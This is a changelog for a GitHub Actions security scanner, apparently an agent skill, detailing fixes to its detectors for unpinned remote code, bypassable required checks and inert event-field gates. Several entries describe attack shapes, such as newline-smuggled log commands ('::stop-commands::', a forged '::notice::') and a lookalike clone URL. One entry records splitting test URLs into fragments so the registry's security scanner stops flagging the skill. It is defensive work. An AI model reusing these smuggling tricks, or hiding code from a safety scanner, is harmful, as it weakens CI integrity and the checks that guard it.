# Changelog

All notable changes to the **ci-secure** skill. The skill is unversioned;
entries are dated (UTC). Format loosely follows
[Keep a Changelog](https://keepachangelog.com).

> **Note on PR/issue numbers.** Entries below reference the pull requests and
> issues of the skill's pre-public development archive, which is not part of
> this repository's history. The numbers are kept for the maintainers' audit
> trail; they are not links you can follow here.

## [Unreleased]

### Fixed

- **2026-08-17** — **A partial checkout no longer reports as complete
  coverage.** Every detector reasons about the files it can see on disk, so a
  `git sparse-checkout`, a partial clone, or a locally-deleted workflow was
  invisible to the scanner: it ran on what was present, found nothing in what
  was absent, and rendered `Coverage | ✅ complete — every workflow file was
  scanned`. On a checkout holding 1 of a repository's 8 workflow files that
  sentence reads as a clean bill of health for a repository the scan never
  looked at, and it let the config facts assert *"all 1 workflow(s) declare
  `permissions:`"* about seven files nobody opened. The scan now asks git for
  the audited commit's own tree (`git ls-tree` reads the object database, so it
  sees files a sparse checkout left out of the working tree) and folds every
  absentee into `scan_incomplete`, which flips Coverage to **PARTIAL**, raises
  the incomplete-coverage banner naming each unscanned file, and degrades the
  affected config facts to `unmeasured`. This is the impostor check's rule
  ("a check that could not run is NOT a pass") applied one layer down, to a
  file that was never read. An inconclusive probe — not a git checkout, or git
  cannot answer — reports no gap, so ordinary runs are unaffected. The probe
  clears every git repository-selection variable (`GIT_DIR`, `GIT_WORK_TREE`
  and friends) before running: `git -C <dir>` chooses a working directory, not
  a repository, so an inherited `GIT_DIR` — which git hooks and `git worktree`
  both export — would have pointed the probe at another repository, found no
  workflows there, reported no gap, and silently restored the "complete
  coverage" claim this fix exists to remove.

### Added

- **2026-08-17** — **A finding whose job sits behind a security gate that
  cannot work now says so.** Previously every gate got the same sentence —
  *"the finding stands only if that gate can be bypassed; verify it"* — which
  is the wrong instruction when the gate compares against an event field the
  workflow's own triggers never populate. Snowflake's `jira_issue.yml` (Wiz,
  Jun 2026) gated on `github.event.pull_request.user.login` under an `issues`
  trigger, where there is no pull request: the comparison ran against an empty
  value, so the gate admitted every GitHub user while reading like it admitted
  one bot. The evidence now names the dead field, and calls the gate INERT
  where the condition is that comparison and nothing else. Deciding this is a lookup of
  which trigger fills which event object, not a judgement about bypassability —
  a gate is only called inert when NO trigger the workflow declares could
  populate the field, and a trigger whose payload we cannot know (`workflow_call`
  runs on the caller's event) yields no verdict at all. The direction is read
  off the condition rather than assumed: the same dead comparison written with
  `==` admits *nobody* instead of everybody, and a dead term sitting next to a
  live one settles nothing, so those get the dead-field fact and the ordinary
  "verify it" instead of a verdict. Injection findings
  (P14.10) carry the gate note now — the dead-field half of it only, since an
  injection is worth fixing whether or not its gate holds — and carry it
  alongside the quoted excerpt rather than inside it, so the scanner's own
  conclusion is never rendered as a line of your workflow file. Two payload
  corrections ride along: `deployment` and `deployment_status` do populate
  `github.event.workflow_run`, and a step with its own `if:` withdraws a
  verdict about who reaches the job. Where no verdict is available, the note
  says the dead comparison always evaluates the same way and stops there — it
  does not call the term harmless, because a constant is the opposite of
  harmless beside another term: `A && (empty == 'x')` is always false and shuts
  the gate on its own, and `A || (empty != 'x')` is always true and opens it
  whatever `A` says. No finding is added, removed, or re-scored by this — it changes what the
  evidence tells you about findings the scan already reports.

- **2026-08-15** — **The blocking rule is now part of the skill, as three
  independent names in `config.py`.** `BLOCKING_OUTCOMES` (which fact outcomes
  fail a build), `KNOWN_OUTCOMES` (which are recognised at all) and
  `OUTCOME_MARKS` (how each is displayed), plus `coverage_is_complete()`, which
  says whether the three agree. None is derived from another — in particular
  the first two are never computed from the display table, because that
  coupling lets a cosmetic edit widen the set of accepted outcomes and ship a
  new failure state as a pass. Anything running ci-secure as a CI gate imports
  these instead of hardcoding a copy that can drift from the engine's.

- **2026-08-15** — **You can now set ci-secure up as a CI check in your own
  repository.** Say *"install ci-secure as a CI check"* and it (1) COPIES the
  engine, gate and licence into your repo plus one workflow, as a pull request
  you review and merge; (2) REPORTS WITHOUT BLOCKING on the first run, so the
  setup does not brick your merge path on day one; (3) becomes blocking when
  YOU delete the `--advisory` flag and add `ci-secure` to your required checks;
  (4) is undone by removing that required check, never by deleting the
  workflow. Nothing happens on its own, and it blocks only after you make it
  required.

  Nothing is fetched and executed at CI time — a pin can be moved or deleted in
  a repository you do not control, and we ship a detector for that shape
  (P14.24). `scripts/vendor.py` does the copying and writes a `VENDORED.json`
  of per-file hashes that your own CI re-checks every run, so a local edit to
  the copied gate is loud instead of invisible. `--advisory` downgrades failed
  FACTS only: a crashed engine, zero workflows scanned, an unrecognised outcome
  or an incomplete scan stay red, because a ramp for findings must never become
  a mute button for a broken scan. Updating re-copies the code and never
  rewrites your workflow file — the runner, the triggers and the flag you
  deleted are yours. The copied gate is held byte-identical to the one this
  repo runs on itself, so a weaker copy cannot ship.

  Setup refuses anything that is not plainly your repository rather than
  writing and hoping: a destination that resolves outside it, a subdirectory
  rather than the root, or a `ci-secure/` directory already holding files of
  yours. `--verify` treats compiled bytecode and symlinks under the copied tree
  as drift even when the manifest lists them, since the manifest is repository
  content and cannot exempt them.

- **2026-08-15** — **`config.py` now owns the one definition of how a scanned
  string is neutralized.** `flatten_scanned()` collapses whitespace, replaces
  the backtick and escapes the pipe — the rule the report renderer already
  applied, moved somewhere a stdlib-only CI gate can import it too. The
  renderer delegates to it rather than keeping a copy: two copies of an
  escaping rule eventually differ, and the surface with the weaker copy is the
  one an attacker aims at.

### Fixed

- **2026-08-15** — **The gate setup instructions cover the paths a real
  session actually takes.** Setup and refresh are the same command, and which
  one runs is decided by whether `VENDORED.json` is already there — so an
  agent following the setup steps on a repo that had the vendored copy but no
  workflow announced a workflow that was never written. The instructions now
  name that discriminator, stop rather than guessing when the destination is
  not a git work tree, warn when a repository has no workflows at all (the gate
  reds permanently on "nothing scanned", which `--advisory` does not clear),
  say that the copied files are left uncommitted and nothing runs until they
  are committed, complete the list of refusals, and require checking for local
  edits before a refresh overwrites them. "Make ci-secure block my PRs" now has
  a procedure of its own instead of resolving to a setup run that changes
  nothing. Backing the gate out has an order: the workflow first, then the
  vendored directory.

- **2026-08-15** — **`--verify` no longer passes a vendored copy that was made
  smaller than the one that was reviewed.** Deleting a vendored file *and* its
  `VENDORED.json` entry left every remaining hash correct, so the drift check
  reported a match — the manifest was allowed to define its own domain. This is
  not the documented "anyone who can edit the gate can edit the manifest"
  caveat: nothing is edited-with-a-matching-hash, the copy is simply shrunk. It
  matters most for `config.py`, the rule that says which outcomes block: with
  the vendored copy gone the gate falls back to a path *inside the repository
  being audited*, so one pull request could delete the rule here, add its own
  there, and be judged by a rule it wrote — under a green drift check. The
  manifest is now checked for completeness before any hash is compared.

- **2026-08-15** — **The setup no longer asks the wrong repository whether a
  destination is a repository root.** `GIT_DIR` overrides `git -C`, so an
  exported one — from a hook, a `rebase -x`, a worktree-driven session — made
  the subdirectory guard read an unrelated repository's toplevel, refuse a
  perfectly good install, and tell you to vendor the gate and a live workflow
  into *that other repository* instead. The same variable made the recorded
  source commit a stranger's HEAD. All git calls now run with the ambient
  `GIT_*` variables stripped. Relatedly, the working-tree-dirty check now has
  the timeout and return-code check its sibling call always had: any failure of
  `git status` previously read as "clean" and stamped the manifest with a bare
  sha, which asserts this copy is byte-for-byte the published commit.

- **2026-08-15** — **`--verify` escapes what it reads out of your repository
  before printing it.** `VENDORED.json` arrives with a branch, a pull request
  checkout or a fork clone, and its strings went to a step log unescaped — a
  newline in the recorded version forged a `::notice::all clear` on the check
  run, and one in a `files` key emitted `::stop-commands::`, swallowing every
  drift reason printed after it so the step red with no stated cause. The gate
  has escaped engine output for this reason all along; the drift check runs in
  the step above it and reads from the same trust class.

- **2026-08-15** — **`PYTHONDONTWRITEBYTECODE` now covers the whole scan job.**
  Scoped to the gate step alone, it stopped one step short of the drift check
  itself — the step whose entire purpose is rejecting bytecode was the one
  Python was free to write it from.

- **2026-08-15** — **The skill imports again on Python 3.9**, the floor
  `pyproject.toml` declares. `config.py` was the only module under `scripts/`
  without `from __future__ import annotations`, so the PEP 604 (`X | Y`)
  annotations added alongside the outcome tables were evaluated at definition
  time and raised `TypeError` on import — taking `scan.py`, `report.py` and any
  CI gate down with it for every 3.9 user. Every workflow in this repository
  pins 3.12, so CI could not see the break. A test now asserts the rule for
  every module under `scripts/` rather than leaving it to habit.

### Changed

- **2026-08-15** — **`__version__` / `VERSION` bumped to 0.2.0** for the
  changes in this entry. The constant is stamped into the report's Scanner row,
  so an installed skill carries it as its provenance marker.

- **2026-08-14** — **P14.24's rendered finding title is now "Unverified remote
  code execution", not "Unverified remote script execution".** The entry covers
  two shapes and a title naming only one of them would misdescribe half its
  findings. Reports generated before and after this change print different
  titles for the identical defect; the pattern id, the severity and the fix
  anchor are unchanged, so anything keyed on those still matches.

- **2026-08-14** — **A single-star branch filter (`branches: ['*']`) no longer
  certifies a required check.** GitHub's filter glob `*` matches a run of
  characters that does NOT include a slash, so `feature/x`, `dependabot/…` and
  every slashed head branch escape it — an always-running job under `['*']`
  cannot be shown to run on every pull request. It was read as match-all and
  certified the check while the reachable PR producer could skip; it routes to
  UNKNOWN now, alongside the other specific-branch filters. `**` still certifies.

- **2026-08-14** — **A push that ignores every branch (`branches-ignore:
  ['**']`) is treated as a non-producer, not a bypass.** The push fires on no
  branch, so it can never report a check on a pull request — the check stays
  pending and the merge is blocked, it does not green. Left as UNKNOWN, a sole
  skippable producer under it was counted as a bypassable required check and the
  fact went RED on a repository whose merges are in fact always blocked.

- **2026-08-14** — **A bypassable required check found on a partially-read
  branch protection now discloses that the required-check list was itself a
  floor.** When only one protection source could be read (the other 403'd), the
  fail evidence dropped the partial-read caveat the pass and unmeasured arms
  both carry, so the reader was judged against a list they were never told was
  incomplete — a check configured only in the unread source is invisible here.

- **2026-08-14** — **P14.24: an execution whose path BEGINS with an unresolved
  shell variable (`$MYVAR/tool.sh`) is a coverage note, not a finding.** It was
  joined onto the working directory and, inside a third-party checkout, fired —
  but the variable could hold an absolute path that escapes the tree, so
  resolving it was a guess. The runner's own absolute variables are still
  resolved, and a variable DEEPER in a path rooted at the fetched directory
  (`tools/$V/run.sh`) is inside the tree whatever it holds and still fires.

- **2026-08-14** — **P14.24: `bash -o pipefail tools/run.sh` and its kin no
  longer miss the execution.** `-o` (and bash's `-O`) name a shell OPTION as
  their value, so the script is the next word; read flatly, `pipefail` was taken
  for the path and the real execution silently missed. Scoped to the shells —
  python's `-O` is a boolean and still runs its script.

- **2026-08-14** — **P14.24: a nested command substitution
  (`OUT=$(echo $(tools/setup.sh))`) is now scanned.** `$(…)` runs its body and a
  body can hold another `$(…)`; reading only the outer level left the inner
  execution a silent false clean — no finding, no gap.

- **2026-08-14** — **P14.24: a re-clone of a directory after an earlier pin is
  no longer read as pinned.** clone → pin → re-clone → run: the tree that runs
  is the unpinned re-clone, but keeping the FIRST fetch let the pin (which sat
  between the stale first clone and the execution) suppress the finding, so the
  job went silent while it ran unpinned remote code. The last unpinned fetch
  into a destination wins; a genuine pin of that surviving fetch still
  suppresses.

- **2026-08-14** — **P14.24: a trailing re-clone nothing runs from no longer
  buries an earlier clone that WAS executed.** The last-unpinned-fetch-wins rule
  (above) overwrote the destination with a re-clone even when nothing ran from
  it; the ordering guard then found no execution after that trailing fetch and
  the job went silent while an earlier clone had already been executed —
  `clone → run → re-clone` read as clean. Overwritten clones are now kept as
  fall-back candidates: the surviving fetch is tried first, and the earlier tree
  a command actually ran from still fires (and still suppresses when it was
  pinned before it ran).

- **2026-08-14** — **P14.24: a single-line `run:` value written with YAML quotes
  is read as the parser saw it.** `run: "git clone … && bash x.sh"` was scraped
  raw, so the quotes reached the shell tokenizer and the whole line came back as
  one quoted word — the clone and the execution both vanished, a silent false
  clean. Block scalars and multi-line scalars are unaffected.

- **2026-08-14** — **Test and doc surface reshaped so it stops tripping the
  registry's own scanner.** No behaviour change: every URL these tests build is
  byte-identical at run time, and nothing any test asserts moved. The scanner
  reads SOURCE text, and it was reading this branch's fixtures as obscured
  download endpoints — its own words: "template/placeholders or format-string
  git endpoints (e.g. containing `{…}`, `$-vars`, `%s` or embedded userinfo)".
  The branch sat on its decision boundary and tipped to a CRITICAL verdict on
  roughly one run in five, which for a public listing that gets one scan per
  audit cycle is a launch risk rather than a flake. Test URLs are now assembled
  at run time from fragments that are not URLs in source, and the README
  describes a piped installer in prose instead of spelling the token. The
  vector's own title keeps its name — it is anchor-paired with the catalog's
  table of contents and rendered into findings.

- **2026-08-14** — **A path-filtered push no longer certifies a required check
  just because its branch filter matches everything.** `branches: ['**']` was
  answered before `paths:` / `paths-ignore:` was read, so an always-running job
  in such a workflow was accepted as proof that the check always reports — when
  a pull request touching nothing under those paths never starts it, and the
  real producer skips. The check greened with neither job having run. That
  combination is UNKNOWN now: it still counts against the check, so a
  bypassable job there is still found, but it can never be the evidence that
  one always reports. A `branches-ignore:` written alongside
  `branches: ['**']` defeats the shortcut for the same reason — the two
  contradict each other, so "runs on every push" is not a claim this scan
  can make about the pair — though GitHub does not accept both filters on one
  event, so that guard is defensive rather than a live defect. The shape that
  IS expressible, and was a live false pass, is a `!` pattern inside
  `branches:` — GitHub's documented (and only) way to write "everything
  except". `branches: ['**', '!release/**']` was read as match-all and
  certified a check that never reports on an excluded branch. An otherwise
  unfiltered `branches: ['**']` push still certifies.

- **2026-08-14** — **A constant `if:` no longer certifies a verdict job that
  has `needs:`.** `if: true` (and `${{ 1 == 1 }}`) is not `always()`: GitHub
  skips a dependent when a dependency skips unless the condition is `always()`
  or `!cancelled()`, so a constant-conditioned verdict job with dependencies is
  exactly as bypassable as the suite it gates — and the fact returned a
  measured pass for it. The same false green as `success() || failure()`, one
  condition over. Without `needs:` a constant still certifies, since it cannot
  be false and reding it would be a false RED on a repository that did nothing
  wrong.

- **2026-08-14** — **A matrix job no longer certifies the bare context it never
  emits.** GitHub appends the combination to a matrix job's check name, so a
  job named `test` reports `test (3.11)` and `test (3.12)` and never `test`.
  Matching the exact display name before considering the expansion meant a
  branch requiring the bare `test`, with only that matrix job to produce it,
  read as a measured PASS — a green over a required check that can never
  report at all. Such a context is unproduced now, and routes exactly where
  every other unproduced context does. The evidence names the near miss rather
  than the generic "no job reports it", so a reader is not sent hunting for an
  external app that is not there: it says which matrix job is involved and that
  requiring one of its expansions is the fix. A templated display name stays
  generic, since the producer match cannot read it either.

- **2026-08-14** — **A pin applied after an `actions/checkout` can suppress
  again — the fix recipe's own shape had stopped being recognised.** Giving
  checkout-arm fetches a suppression window (so a pin applied to a tree the
  checkout later replaced could not silence a finding) opened that window at
  the first EXECUTION-shaped command after the fetch. That execution is the
  reported one, so the interval was empty and no later pin could ever land in
  it: checkout, `git -C tools checkout <40-hex>`, run — exactly what the
  catalog teaches — was reported, and whether it was depended on an unrelated
  command happening to sit in between. The window opens at the first shell
  command of any kind now. The `git clone` arm was never affected, and the
  shipped test covered only the direction that fires.

- **2026-08-14** — **`success() || failure()` no longer certifies a verdict job
  that has `needs:` — the recommended fix was itself bypassable.** It reads
  like `always()` and behaves like it only while the job has no dependencies.
  Once it does, a SKIPPED dependency makes both predicates false, so GitHub
  skips the verdict job too — and a skipped required check is precisely what it
  reports as passed. The fact was therefore certifying the exact shape it
  recommends, with the hole it exists to find. `always()` and `!cancelled()`
  both still run when a dependency skips, and are what the fix recipe names
  now, in the census document and in the code's own docstring.

- **2026-08-14** — **A runner-absolute path is no longer resolved inside a
  checkout.** `$GITHUB_WORKSPACE`, `$HOME`, `$RUNNER_TEMP` and the runner's own
  directories are absolute by GitHub's contract, but they were joined onto the
  step's `working-directory:` — so a `vale` binary downloaded from its own
  release page and sha256-verified was reported as executing "from" a docs
  checkout on a real repository. That was one of only two findings the scanner
  produced across a seven-repository corpus, and its evidence was fabricated.

- **2026-08-14** — **The second chain on a line is described, not just named.**
  One line is one place to fix, so folding two findings is right — but the kept
  finding's prose described only the first chain, so what runs out of the
  second tree was stated nowhere. Its claim is folded in now.

- **2026-08-14** — **Three smaller losses, and the tests that had been missing
  under them.** An expression's inner spacing split a directory in two:
  `apps/${{ matrix.app }}` and `apps/${{matrix.app}}` are the same place to
  GitHub, but keying on the raw text made them two unknown ones, so a chain
  across them produced no finding and no gap. Sourcing an extensionless fetched
  path (`. tools/env`) was invisible to the relevance test — and the shipped
  test for that used `tools/env.sh`, whose `.sh` matched on the unfixed code
  too, so it passed either way and masked the hole it claimed to close. And
  coverage notes from the checkout arm carried no line number, so two steps
  with the same unresolvable expression deduped into one entry and the banner
  under-counted.

  Alongside them, three mutants that had been surviving a green suite now die:
  the memo returning a different answer on a cache hit (its only test asserted
  a call count and `is not None`, and the "unknown" type IS not None), the
  coverage-note headline restoring the "were NOT scanned" wording the channel
  split exists to prevent, and notes no longer breaking the completeness flag —
  which let the header call a scan complete directly above a warning banner.

- **2026-08-14** — **The partial-read disclosure named the source that
  ANSWERED.** The sentence hardcoded "read from rulesets only" and cut the
  unread source's name out of the error list, so when the RULESETS arm was the
  one that 403'd — a GitHub App token, a fine-grained PAT — the shipped
  markdown told the reader that rulesets could not be read. Both halves come
  from which source actually succeeded now.

- **2026-08-14** — **A 404 means "not protected" only when GitHub says so.**
  The comment claimed the status AND the reason were matched; the regex was a
  bare `404`, so a branch renamed between the two calls, a plan-gated endpoint,
  even a 502 quoting 404 in its body all became "nothing required here" — a
  measured PASS over a source that was never read.

- **2026-08-14** — **The expression stand-in can no longer leak into a
  report.** `${{ env.DIR }}2` tokenized to the stand-in followed by a literal
  digit, which the render pattern swallowed, so the lookup missed and the
  scanner's own token appeared where the reader's directory belongs. The token
  is delimited with the NUL sentinel now — untypeable in YAML, so nothing a
  workflow contains can collide with it. The token registry was also a module
  global never reset, letting one workflow's expression text render inside
  another's finding depending on scan order; it resets per scan. And
  `verify_report.py` gained the invariant that no scanner-internal marker
  survives into the report — it had been passing on a leaking one.

- **2026-08-14** — **Which flags mean "the program is on the command line"
  depends on the interpreter, and only leading flags are the interpreter's.** A
  flat whitelist scanned over every argument leaked both ways. `-e`/`-E`/`-p`/
  `-n` are ordinary shell and Python options, so `bash -e tools/install.sh` and
  `bash tools/install.sh -n` — where the flag belongs to the FETCHED SCRIPT —
  became silent false cleans on exactly the chain this vector catches. And
  spellings the list did not carry (`bash -lc`, `perl -lane`, `php -r`,
  `pwsh -Command`, `powershell -EncodedCommand`) still rendered the program
  text as "the executed path". A flag's VALUE is no longer read as the path
  either (`python3 -W ignore tools/setup.py`).

- **2026-08-14** — **`$( … )` runs its body, and the body is read again as
  commands.** Collapsing the substitution before tokenizing killed the
  `$(ls tools/x.sql)` nonsense fire and took real executions with it:
  `OUT=$(tools/setup.sh)` after a mutable clone produced no finding, no gap and
  no suppression — while the backtick spelling of the same construct still
  recorded one, so the scanner disagreed with itself about the same shape.

- **2026-08-14** — **A checkout of your OWN repository no longer raises the
  "not a clean result" banner.** The `repository:`-expression gap ran before
  the self-repository test, so `repository: ${{ github.repository }}` — the
  exact spelling the clone arm was taught to recognise — was recorded as
  "whether it fetches a third party was NOT established". Two real repositories
  open their reports with that warning over nothing but self-checkouts. The
  genuinely unknowable fork-PR spelling stays a disclosed gap. The environment
  variable `$GITHUB_REPOSITORY` is recognised as self-identifying too.

- **2026-08-14** — **Two wiring bugs in how the composed-YAML step marks are
  used, and the pin bookkeeping beside them.** The checkout arm collected the
  line of EVERY step carrying a `uses:` key while its index counted only
  `actions/checkout` steps, so any `actions/setup-*` step ahead of the
  third-party checkout — nearly every real workflow — shifted the mapping. The
  evidence quoted the wrong step, and when the shift moved the checkout earlier
  than a `run:` step it invented a chain whose execution happens BEFORE the
  fetch, breaking the ordering contract the arm rests on.

  A step's `working-directory:` was matched to the first shell start at or
  after its `run:` line, searched over the whole file rather than the step. A
  flow-style `- {run: …, working-directory: vendor/x}` — which the line regex
  cannot see as a shell start at all — therefore donated its directory to the
  next block-scalar step, in a DIFFERENT job, fabricating a destination there
  and moving a real chain out of the fetched tree here. Both are now bounded to
  the step's own source span.

  Pins: only the earliest per destination was kept, while the rule needs ANY
  pin between the fetch and the execution — so a repository that pinned an old
  tree, discarded it, re-cloned and re-pinned (the fix recipe, applied twice)
  was told it executes unpinned remote code. And a checkout-step fetch had no
  position at all, so every pin in the job counted as "before anything ran from
  it", including one applied to a tree the checkout then replaced.

- **2026-08-14** — **A filtered `push` workflow's jobs are no longer dropped as
  producers — that re-opened the lever this fact exists to close.** Rejecting
  every branch- or path-filtered push removed the producer entirely, and when
  it was the only one the fact went UNMEASURED: an unmeasured fact scores
  nothing while a fail scores zero, so a repository whose required check really
  could be bypassed came out ahead of one that configured protection properly.
  The same "unmeasurable beats failing" lever, moved out of the API arm and
  into the producer arm. It also failed the reverse direction — a genuine
  always-running producer under `branches: ['**']` was vetoed and a correctly
  gated repository went RED.

  A workflow's ability to report on a pull request is three-valued now. A
  `pull_request` workflow, a plain `push`, or a push over every branch CAN
  report and may certify a check. A tags-only push provably CANNOT and is not a
  producer. A push filtered to specific branches or paths — including
  `paths-ignore:`, which was not considered at all — is UNKNOWN: its jobs still
  count against the check, but can never be the evidence that one always
  reports. Unknown is never treated as absent.

- **2026-08-14** — **Smaller corrections found alongside the round-2 review.**
  A rulesets response of an unexpected shape (an error object, a paginated
  envelope) was skipped while the source was still marked READ, so it meant
  "this branch requires nothing" — the classic arm treats an unexpected shape
  as unread, and an asymmetry between two sources decides the verdict. A
  constant condition written the long way (`if: ${{ 1 == 1 }}`) still read as
  a bypass. `${{ github.repository }}` was matched ANYWHERE in a clone URL, so
  a stranger's URL that merely embeds yours (`…/evil/${{ github.repository
  }}-mirror`) was treated as a self-clone and silenced — a guard that
  suppresses findings has to match exactly. An `actions/checkout` whose
  `repository:` is computed at run time is now a coverage gap instead of a
  finding naming a third party the scan never established. And the `needs:`
  walk is memoized: a 12-level graph two jobs wide took 8,191 visits where 26
  suffice.

- **2026-08-14** — **A branch- or path-filtered `push` workflow can no longer
  veto the real producer.** Only the tag-only shape was rejected, but
  `on: push: branches: [main]` — the deploy-workflow shape, far commoner — does
  not run on a pull request's branch either. A job named `test` in one was
  accepted as an always-running producer of the required `test` context and
  turned the real, gated producer's bypass green.

- **2026-08-14** — **Unreadable shell that looks like an EXECUTION is recorded
  again.** The relevance test matched command names only, so a bare path
  (`tools/setup.py --msg=it's here` — an apostrophe `shlex` refuses) matched
  nothing: a visible clone at a branch followed by that line produced zero
  findings AND zero gaps, a silent false clean on precisely the chain this
  vector exists to catch. A directly-invoked path is now recognised, while a
  `jq` filter with an unbalanced quote still stays quiet, which is what keeps
  the channel from becoming noise.

- **2026-08-14** — **`working-directory:` and checkout steps are read from the
  parsed document, not scraped off raw lines.** Three defects, one root cause —
  a regex over the same bytes the parser had already read correctly:
  `working-directory: .   # repo root` took the YAML comment into the value and
  rendered a destination of `` `.   # repo root/tools` ``; a
  `working-directory:` written inside a HEREDOC BODY — text the step generates,
  not configuration of the step — was read as the step's own, so a finding
  stated a destination lifted from generated content; and checkout steps were
  tied to lines by counting `uses:` occurrences in order, so the same words
  appearing in a heredoc shifted every later step and the evidence quoted a
  line of shell script.

- **2026-08-14** — **A pin now has to land between the fetch and the
  execution.** A `git checkout <40-hex>` written BEFORE a fetch pinned the tree
  as it stood, not the code the fetch then brought in — and it suppressed the
  finding while stating the fetch "was pinned before anything ran from it".

- **2026-08-14** — **Two fetches on one line no longer collapse into one that
  names only the first.** Deduplication treats one line as one place to fix,
  which is right, but the second chain was disappearing without a trace because
  the finding identified itself by the whole LINE. It identifies itself by the
  fetch — destination and ref — so both are named.

- **2026-08-14** — **Expressions are opaque, consistently, and never rendered
  as scanner internals.** One family of defects, all from `${{ }}` values:

  - A computed `defaults.run.working-directory` was skipped rather than treated
    as unknown, so the finding named a directory the data does not contain —
    and an unreadable JOB default fell through to the WORKFLOW's, inverting
    GitHub's precedence and placing the step somewhere it demonstrably did not
    run. `defaults: {run: {working-directory: apps/${{ matrix.app }}}}` is a
    mainstream monorepo shape. It gets the same opaque treatment a step's does.
  - A step's `working-directory:` was resolved AGAINST the job default instead
    of replacing it, putting a step under `app` into `app/app` and losing real
    chains through the job's own default directory.
  - Every expression collapsed to ONE shared token, so a clone into
    `${{ env.DIR_A }}` and an execution from `${{ env.DIR_B }}` matched — a
    chain the reader cannot find in their own YAML. Tokens are per expression
    text now: the same expression twice is one place, two different ones never
    are.
  - The opaque root was keyed by step LINE, so two steps under the same
    `apps/${{ matrix.app }}` were two different unknown places and produced no
    finding and no gap, while the single-step spelling fired. Keyed by
    expression text now — and splitting fetch and execution across steps is the
    more idiomatic form, so this was the common case.
  - The opaque sentinel — a NUL byte — reached `derived_note`, findings.json
    and the rendered markdown, showing the reader a raw control character where
    their directory belonged. Findings now render the text as the YAML wrote
    it, with an artifact-level guard asserting no scanner-internal marker
    survives into the report.

- **2026-08-14** — **A deliberate non-report no longer reads as missing
  coverage.** Pin suppressions were written into the same list as genuine
  coverage gaps, which the report renders as *"Incomplete coverage — N run:
  step(s) … were NOT scanned … This is **not** a clean result"* — so a
  repository that did exactly what the fix recipe says (clone, pin to a full
  commit id, run) got the report's loudest honesty warning, with a bullet
  underneath explaining that the step had been read completely. The same
  banner fired for `actions/checkout` with `ref: ${{ inputs.ref }}`, the
  standard `workflow_dispatch` spelling, so most real repositories carried a
  permanent false alarm on the one signal that has to stay credible.

  There are three channels now. An unanchorable `run:` step keeps the existing
  headline, which was written for it. A step that WAS read but carries a value
  the YAML does not contain — a computed `working-directory:`, a `ref:` chosen
  at run time, shell no parser accepts — gets its own sentence, still "not a
  clean result" but described accurately. A suppression is informational and
  never touches coverage at all.

  Alongside it, the two ordinary pin spellings are recorded at last: a clone
  whose own `--branch` is a full sha, and a checkout with a 40-hex `ref:`,
  both returned silently while the catalog and the changelog claimed every
  suppression was recorded.

- **2026-08-14** — **P14.24 no longer reports an interpreter's inline script as
  "the executed path".** `-e` / `-pe` / `-ne` / `-p` / `-n` put the program on
  the command line exactly as `-c` does, and `-` reads it from stdin, but only
  `-c` and `-m` were recognised — so the script TEXT became the path, and being
  relative it satisfied the containment test and completed a chain. A real
  public repository's three fires included "executes `chomp if eof` from it"
  (the line was `perl -i -pe 'chomp if eof'`) and "executes `<<PY`" (the line
  was `python3 - <<'PY'`). A `<<NAME` token is now rejected too, and a command
  substitution is collapsed before the command is read: `FILE=$(ls tools/x.sql)`
  had its assignment prefix stripped and the `ls` ARGUMENTS read as the
  command, so a path `ls` merely listed was reported as executed — `ls` being
  the code's own docstring example of something that is not execution.

- **2026-08-14** — **`git remote add` makes the same self-clone judgment
  `git clone` makes.** The two-step spelling registered any URL-shaped remote,
  including the repository's own, so the identical URL was silent through the
  clone arm and a finding through the fetch arm — two arms, opposite verdicts,
  same repository.

  Measured across five real checkouts (143 workflow files) before and after:
  P14.24 fires 3 → 1, and the one that remains is the true positive (a clone at
  a version variable followed by `./configure`). Coverage gaps 14 → 13.

- **2026-08-14** — **A `404 Branch not protected` is an answer, not an unread
  source.** GitHub returns it from the classic protection endpoint precisely
  when classic protection is NOT configured — the normal state of every
  repository that uses rulesets, which is the population
  `sec.required-checks.skippable` was built for. Reading it as a failure made
  the fact unmeasurable for all of them, and unmeasurable scores *better* than
  failing: a repository with a genuinely bypassable required check came out
  ~11 points ahead of the same repository with classic protection configured
  empty. The 404 now means "nothing required here", scoped to that one endpoint
  — a 404 from the repository or rulesets endpoint is still a missing
  repository or a wrong path, and the fetcher's requested paths stay asserted
  literally in the suite so a typo cannot hide behind it.

- **2026-08-14** — **A partial read now says which source it could not read.**
  When classic protection 403s — the ordinary case for anyone without admin on
  the repository — the rulesets answer is used, and it was rendered as
  complete: "all 1 required check(s) …". A check configured only in classic is
  invisible to that read, so the count is a floor rather than a total, and the
  evidence now says so.


- **2026-08-14** — **`sec.required-checks.skippable` no longer reports a green
  over checks it never examined.** Five ways it did: `always()` was matched as a
  SUBSTRING, so `always() && <fork guard>` — the bypass this fact exists to
  catch, with two tokens prepended — read as never-skipping; `success() ||
  failure()`, the third spelling of the verdict-job condition, was not
  recognised and failed a job that always reports; a required context produced
  by no job here was excluded from judgment but still counted toward a sentence
  claiming "every required check is produced by a job that always runs", which
  when ALL of them were external made the row a claim about an empty set; a
  `needs:` naming a job that is not in the file (and a `needs:` cycle) resolved
  to "always runs" instead of "unknown". Each context now resolves three ways —
  gated, bypassable, or NOT JUDGED — the pass sentence states how many of the required checks it
  actually traced, and a scan that traced none of them is unmeasured rather
  than green.

- **2026-08-14** — **A malformed `needs:` graph no longer takes exponential
  time to walk.** The unknown-dependency branch called the recursion twice per
  level — once to test the result's type, once to use it — so the work doubled
  with every link: a linear chain ending in a typo'd job name took 3.4 seconds
  at depth 22 and about a quarter of an hour by depth 30. That is precisely the
  hang the cycle guard's own docstring promises cannot happen. Each dependency
  is walked once now.

- **2026-08-14** — **P14.24 covers `actions/checkout` of another repository.**
  It is how most workflows fetch a second repository, and at a branch or tag it
  is the identical trust model — but the detector read `run:` shell only, so
  the most common spelling was the one it could not see. A checkout naming
  another `repository:` at a mutable `ref:`, with something in a later step of
  the same job executing out of its `path:`, now reports. A full 40-hex `ref:`
  is silent, your own repository is silent, and a `ref:` or `path:` computed at
  run time is recorded as a coverage gap rather than guessed at.

- **2026-08-14** — **A `working-directory:` computed at run time no longer
  blinds the step it is on.** `apps/${{ matrix.app }}` is extremely common;
  skipping those steps lost every chain inside them. Such a directory is now
  opaque instead: a fetch and an execution both inside it still connect to each
  other, and nothing inside it can match a directory anywhere else. Unreadable
  shell is likewise only recorded as a coverage gap when the text that could
  not be parsed mentions a fetch or an execution — reporting every `jq` filter
  with an unbalanced quote produced about eight notes per repository.

- **2026-08-14** — **P14.24 stops claiming executions pip does not perform, and
  stops going quiet without saying so.** Five edges:

  - **`pip install` flag VALUES were read as executed paths.**
    `pip install --target tools/deps requests` reported "executes
